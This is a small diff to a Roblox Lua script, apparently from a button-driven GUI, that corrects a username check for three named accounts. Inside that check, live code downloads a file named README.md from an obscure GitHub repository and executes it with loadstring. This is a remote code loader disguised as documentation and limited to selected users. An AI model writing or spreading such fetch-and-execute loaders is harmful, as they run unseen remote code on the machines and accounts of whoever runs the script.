@@ -25,6 +25,7 @@ confirmButton.MouseButton1Click:Connect(function()
     end
 end)
 local player = game.Players.LocalPlayer
-if player.Name == "Carneassadagotoza" or "Nicollasbobo1" or "allefmito123" then
+if player.Name == "Carneassadagotoza" or player.Name ==  "Nicollasbobo1" or 
+player.Name ==  "allefmito123" then
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Noname929798/Qthbvcgb/refs/heads/main/README.md'),true))()
 end
